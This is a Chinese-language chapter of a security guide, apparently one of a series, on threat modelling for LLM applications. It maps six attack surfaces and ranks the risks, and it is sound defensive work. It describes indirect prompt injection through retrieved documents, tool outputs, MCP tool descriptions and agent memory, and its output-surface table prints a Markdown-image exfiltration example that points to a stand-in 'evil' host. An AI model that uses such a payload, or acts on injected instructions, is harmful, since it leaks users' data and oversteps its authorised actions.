# 威胁模型与攻击面

> **核心问题**：LLM 应用比传统 Web 应用多出来的攻击面在哪？我该先防什么？

---

## 0. 为什么 LLM 应用需要单独一套威胁模型

**因为 LLM 打破了传统应用的一条基本假设：**

```
传统应用：数据流是分段的，段与段之间有明确的类型边界
   HTTP 请求 → 解析 → 业务逻辑 → SQL(参数化) → 渲染(转义) → 响应

LLM 应用：数据和指令走同一条通道，中间没有类型边界
   用户输入 ┐
   检索文档 ├→ 【同一个字符串】 → 模型 → 同一个字符串 → 工具/渲染
   工具返回 ┘
```

**模型无法区分「这是给我的指令」和「这是我要处理的数据」。**
它看到的就是一坨 token。这就带来了五个**传统应用没有的新攻击面**：

| # | 新攻击面 | 后果 |
|---|---|---|
| **1** | **数据与指令不分离** | 任何进入 prompt 的内容都可能变成指令 |
| **2** | **输出会再变回输入** | 模型输出如果被喂回 prompt（Agent 循环、摘要、检索），污染会自我放大 |
| **3** | **能力被放大** | 一段提示可能同时触达多个工具、多个数据源 |
| **4** | **不可复现** | 同样的输入两次结果不同 → 无法用「规则穷举」做防御 |
| **5** | **模型既是决策器又是执行器** | 同一个组件既判断「要不要做」又「去做」，信任边界消失 |

> **推论**：传统 Web 安全的三板斧（输入校验 / 参数化 / 输出编码）**依然有效**，
> 但**不够**——因为 LLM 引入了「不可信内容变成指令」这条通路。
> 必须在架构上重新划信任边界。

## 1. 攻击者画像

**不同攻击者的目标不同，防法也不同。** 按「会不会直接攻击你」排序：

| 攻击者 | 动机 | 典型手法 | 危害 |
|---|---|---|---|
| **好奇的用户** | 好奇、找乐子 | 问 system prompt、套角色 | 低（信息泄露、口碑） |
| **恶意用户** | 拿到不该拿的东西 | 越权查询、提示注入、诱导越权 | **高（数据泄露）** |
| **成本攻击者** | 薅资源 | 无限循环、构造超长输入、批量重试 | **高（直接经济损失）** |
| **竞争者** | 抄能力 | 系统提示提取、模型蒸馏、批量抓取 | 中高（IP 泄露） |
| **内部人员** | 好奇/牟利/离职带走 | 利用审计/运维通道捞数据 | **高** |
| **供应链攻击者** | 投毒、留后门 | 投毒模型权重、投毒 MCP 工具、投毒开源依赖 | **最高** |
| **有组织的攻击者** | 长期渗透 | 组合利用多个低危漏洞 | **最高** |

> **注意**：**成本攻击者经常被当成普通用户**，但他造成的损失是实打实的。
> 见 §6 成本面。

## 2. 资产清单

**先列资产，再谈攻击面。** LLM 应用的资产比传统应用多两类：

| 类别 | 资产 | 例子 |
|---|---|---|
| **数据** | 业务数据 | 客户资料、合同、订单 |
| | **个人信息** | 姓名、身份证、病历、简历 | 
| | **凭据** | API Key、数据库口令、令牌 |
| | **知识资产** | 提示词、评测集、微调权重 |
| **能力** | 工具权限 | 发邮件、下单、写库、调用支付 |
| **完整性** | 输出可信度 | 生成的报告、代码、建议 |
| **可用性** | 服务与预算 | GPU 配额、API 额度、SLA |
| **审计证据** | 记录完整性 | 「谁在何时看了什么」——**被篡改就失去合规价值** |

> **「审计证据」是一个容易被忘掉的资产，但它在合规场景里权重最高。**
> 一个能改日志的系统，等于没有日志。

## 3. 攻击面地图

```
                    ┌──────────────────────────────────────────┐
                    │            LLM 应用攻击面地图              │
                    └──────────────────────────────────────────┘

  ① 输入面 ──────→  ┌────────┐   ③ 工具面 ──────→  ┌─────────┐
  · 用户输入         │        │   · 工具参数          │ 外部系统 │
  · 检索文档         │        │   · 工具返回值        │ 支付/邮件 │
  · 网页内容         │  模型  │   · 工具描述          │ 数据库   │
  · 工具返回值       │        │   · MCP 服务器        └─────────┘
  · 文件/上传        │        │
  · 记忆内容         │        │   ④ 输出面 ──────→  ┌─────────┐
  · 环境变量/元数据  └────┬───┘   · 渲染(Markdown)    │ 浏览器  │
                         │       · 生成代码          │ IDE     │
  ② 模型面 ─────────→    │       · 结构化数据        │ 导出文件 │
  · 权重/适配器/量化      │       · 语音/图像          └─────────┘
  · System Prompt        │
  · 工具描述        ⑤ 供应链面 ─→ 依赖 / 模型来源 / 插件 / MCP server
                         │
  ⑥ 成本面 ─────────→   · 无限循环 / 超长输入 / 批量重试 / 缓存投毒
```

### 3.1 ① 输入面（最容易被忽略的一层）

| 来源 | 信任度 | 典型攻击 |
|---|---|---|
| **用户输入** | 低 | 直接提示注入、越权查询、诱导越权 |
| **检索文档** | **中低** | 文档投毒：入库时植入指令 |
| **网页内容** | 低 | 网页投毒（AI 搜索/网页阅读场景） |
| **工具返回值** | **低** | 工具返回的字段里藏指令 |
| **文件/上传** | 低 | 文档内嵌指令、宏、隐藏文本 |
| **Agent 记忆** | **低** | 记忆投毒：写入的内容带指令，后续被召回 |
| **系统元数据** | 低 | 时间、文件名、用户名里的注入 |

> **关键认知：除了「用户输入」，其他所有来源都是「别人写的内容」。**
> 一个 RAG 系统把**互联网上任何人都能写的页面**喂给了模型——
> 那它就是**在给全网用户一个对模型的执行接口**。

### 3.2 ② 模型面

| 对象 | 风险 |
|---|---|
| **权重 / 适配器 / 量化产物** | 后门、模型投毒、来源不可信 |
| **System Prompt** | 泄露（本身就是知识资产） |
| **工具描述** | 投毒（见 [`03`](./03-间接注入与工具滥用.md)） |

### 3.3 ③ 工具面

| 风险 | 说明 |
|---|---|
| **参数越权** | 工具能操作的资源范围大于当前用户被授权的范围 |
| **返回值投毒** | 返回的字段里带指令，被模型当指令执行 |
| **描述投毒** | MCP 工具的 `description` 里藏指令，模型读到后照做 |
| **链式扩散** | 一个工具的输出喂给下一个工具，风险逐级放大 |

### 3.4 ④ 输出面

| 风险 | 说明 |
|---|---|
| **渲染注入** | Markdown/HTML 里的脚本、链接、图片外泄（`![](http://evil/?data=...)`） |
| **代码注入** | 模型生成的代码被直接执行或粘贴进 IDE |
| **结构化数据注入** | 生成的 JSON 里塞了控制字符/额外字段 |
| **凭据回显** | 模型把上下文里的密钥原样输出 |

> **输出面是最容易被忽视的攻击面**，因为开发者的注意力全在输入侧。
> 但**「模型输出了攻击者控制的内容」是提示注入最常见的变现路径**——
> 注入本身不是目的，**通过输出窃取数据**才是。

### 3.5 ⑤ 供应链面

| 对象 | 风险 |
|---|---|
| **开源依赖** | 投毒、恶意包（typosquatting） |
| **模型权重** | 来源不明 / 被替换 / 带后门 |
| **MCP 服务器** | 第三方提供的工具，能力与描述都不可控 |
| **插件/扩展** | 传统浏览器插件的信任问题在 MCP 上重现 |
| **数据集** | 被投毒或被篡改（见 [`04`](./04-数据投毒与模型安全.md)） |

### 3.6 ⑥ 成本面

**这是 LLM 应用独有的、也是最常被漏掉的一类。**

| 手法 | 说明 |
|---|---|
| **无限循环** | 诱导模型反复调用同一个工具 |
| **超长输入** | 一次请求吃掉整个上下文窗口 |
| **重试放大** | 每个失败请求重试 N 次，成本 ×N |
| **缓存投毒** | 构造大量请求把缓存占满，真实用户享受不到缓存 |
| **并发滥用** | 脚本批量调用 API |

> **成本攻击不需要任何技术门槛，只需要一个脚本。**
> 防御手段是**速率限制 + 预算上限 + 单用户配额**，而不是「检测恶意请求」。

## 4. 风险矩阵

**不是所有攻击面都值得同等投入。** 用三个维度排序：

```
风险 = 可能性 × 影响 × 暴露面
```

| 攻击面 | 可能性 | 影响 | 暴露面 | 优先级 | **首要防线** |
|---|---|---|---|---|---|
| **数据越权（检索层没过滤）** | 中 | **极高** | 高 | **P0** | 检索层权限过滤 |
| **间接注入 → 工具滥用** | **高** | 高 | 高 | **P0** | 工具白名单 + 不可逆动作人工闸 |
| **密钥/凭据泄露** | 中 | **极高** | 中 | **P0** | 凭据不出上下文、不入日志 |
| **成本攻击** | **高** | 中 | 高 | **P1** | 速率限制 + 预算闸 |
| **输出渲染注入** | 中 | 中 | 中 | **P1** | 输出消毒 + 转义 |
| **模型/权重投毒** | 低 | **极高** | 低 | **P2** | 来源校验 + hash |
| **提示词泄露** | **高** | 低 | 中 | **P2** | 不把敏感信息放 system prompt |
| **审计日志被篡改** | 低 | 高（合规） | 低 | **P2** | append-only + hash chain |

> **排序原则**：**先修「可能性高 × 暴露面大」的**（注入与工具滥用），
> 再修「可能性低 × 影响极高」的**（投毒）。
> 中间那类（成本、渲染）适合用通用防护批量覆盖。

## 5. 信任边界怎么划

**这是整个安全设计的核心问题。** 常见的三种错误划法：

| 错误划法 | 问题 |
|---|---|
| **「用户输入 vs 系统」** | 检索文档、工具返回、网页内容也是不可信的，却被当成了「系统」 |
| **「模型 vs 用户」** | 模型会**自主决定**调用哪个工具、带什么参数——它不是可信的决策器 |
| **「进入 prompt 的 vs 没进的」** | 混淆了「被处理」和「被信任」 |

### 5.1 正确的划法：三条独立的轴

```
┌────────────────────────────────────────────────────────┐
│  ① 身份轴：你是谁？                → 认证、身份、租户      │
│  ② 能力轴：你能做什么？            → 工具白名单、动作分级   │
│  ③ 数据轴：你能看什么？            → 行/列/文档级权限过滤  │
└────────────────────────────────────────────────────────┘
```

> **三条轴必须各自独立校验，不能互相推导。**
> 常见的错误是「因为你是管理员所以能看所有数据」——
> 但**管理员也不该在生成报告时看到全库数据**（那是一次批量泄露）。

### 5.2 数据轴的强制位置

```
❌ 错：全量检索 → 应用层过滤 → 送给模型
        └─ 无权数据已经进了上下文，模型可能复述出来

✅ 对：权限过滤在检索层 → 只有有权数据进入检索结果 → 送给模型
```

**这是本章最重要的一条。** 详见 [`05`](./05-Agent权限边界与沙箱.md)。

## 6. 成本面：单独说

**成本攻击是 LLM 应用最低门槛的攻击。** 三种形态：

| 形态 | 表现 | 防御 |
|---|---|---|
| **资源耗尽** | 单请求超大上下文、极端长度输出 | 输入长度上限、输出 token 上限 |
| **循环放大** | 模型反复调用工具 / 反复重试 | **步数上限 + 费用上限 + 工具调用预算** |
| **配额抢占** | 脚本批量调用，吃光正常用户的额度 | **按用户/租户配额 + 速率限制** |

> **防御原则**：**不要试图「识别恶意请求」，直接设上限。**
> 恶意请求和正常的长请求在协议层看起来一样。
> 上限是唯一可靠的办法。

## 7. 红队与蓝队的分工

| 角色 | 做什么 | 产出 |
|---|---|---|
| **蓝队（防御）** | 架构设计、加边界、监控、审计 | 防线清单 + 监控规则 + 审计能力 |
| **红队（攻击）** | 假设攻击路径、设计用例、验证可利用性 | **可复现的最小复现** + 风险等级 |
| **共同** | 每个红队发现都要变成一个**回归用例** | 用例进 CI，永久防住 |

> **红队不做「渗透测试服务」，做「假设-验证」。**
> 一次渗透给你一堆漏洞；一次红队给你的是**一条被验证的攻击链**，
> 以及「这条链上的每一环该怎么补」。

## 8. 一张自查表

**做威胁建模时逐条过。**

| # | 问题 | 答不上来的风险 |
|---|---|---|
| 1 | 我们系统里**哪些内容是别人能写的**？ | 不知道哪些是攻击面 |
| 2 | 这些内容**会进 prompt 吗**？ | 不知道注入面 |
| 3 | 模型能调用哪些工具？每个工具**最坏能造成什么**？ | 不知道能力面 |
| 4 | 权限过滤**在检索层还是应用层**？ | 必然有泄漏路径 |
| 5 | 哪些动作**不可逆**？它们有闸门吗？ | 一次误操作就是事故 |
| 6 | **凭据**在哪些地方出现过（prompt / 日志 / 输出 / 错误信息）？ | 一次泄露全线失守 |
| 7 | 模型输出**会被谁渲染、谁执行**？ | 输出面未设防 |
| 8 | 有没有**速率限制和预算上限**？ | 成本攻击无门槛 |
| 9 | **审计日志**能不能被改？ | 合规价值归零 |
| 10 | 异常行为**能不能被发现**？ | 攻击静默进行 |

## 9. 工程结论

1. **LLM 的新攻击面来自「数据与指令同通道」**——这是与传统应用最本质的差别。
2. **攻击面有六层**：输入 / 模型 / 工具 / 输出 / 供应链 / 成本。
   **输出面和成本面最常被漏。**
3. **「别人能写的内容」就是不可信输入**，包括检索文档、网页、工具返回、Agent 记忆。
4. **风险排序**：先修「可能性高 × 暴露面大」（注入与工具滥用），再修「低概率 × 高影响」（投毒）。
5. **信任边界有三条独立的轴**（身份 / 能力 / 数据），不能互相推导。
6. **数据权限必须在检索层过滤**——应用层过滤等于「无权数据已经进了上下文」。
7. **成本攻击不需要技术门槛**，防御靠上限而不是识别。
8. **红队产出的不是漏洞列表，是可复现的攻击链**，且每条发现都要变成回归用例。
